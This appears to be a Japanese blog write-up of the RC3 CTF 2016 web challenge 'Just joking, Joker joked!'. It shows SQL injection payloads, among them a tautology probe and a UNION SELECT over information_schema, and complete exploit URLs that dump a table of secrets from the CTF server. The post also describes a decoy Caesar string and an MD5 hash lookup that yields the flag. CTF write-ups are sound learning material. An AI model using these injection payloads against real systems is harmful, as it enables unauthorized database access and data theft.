---
layout: post
alias: "/blog/2016/11/21/rc3-ctf-2016-just-joking/"
date: "2016-11-21T17:47:17+09:00"
tags: [ "ctf", "writeup", "rc3-ctf", "web", "sql-injection", "guessing" ]
---

# RC3 CTF 2016: \"Just joking,\" Joker joked!

`' or 1 = 1 -- `で確認できる自明sqliがある。
そのまま`' union select table_schema, table_name, column_name from information_schema.columns -- `とするとDBの中身が見える。後はたくさんあるtableを端から順に見ていって探す。

`flag.welcome`に`pcbfcppgle`とありcaesarしたら`redherring`になるが、これははずれ。
`CCNs.secrets`にあるmd5っぽい文字列をdecryptorに投げると`RC3-2016-HAHAHAHA`が登録されていて、これがflag。
まったく同じinjectionができるDBがふたつあったが、理由は不明のまま。後の問題用か。

-   <https://ctf.rc3.club:2010/connect.php?primary=%27+union+select+table_schema%2C+table_name%2C+column_name+from+information_schema.columns+--+>
-   <https://ctf.rc3.club:2010/connect.php?primary=%27+union+select+*+from+CCNs.secrets+--+>
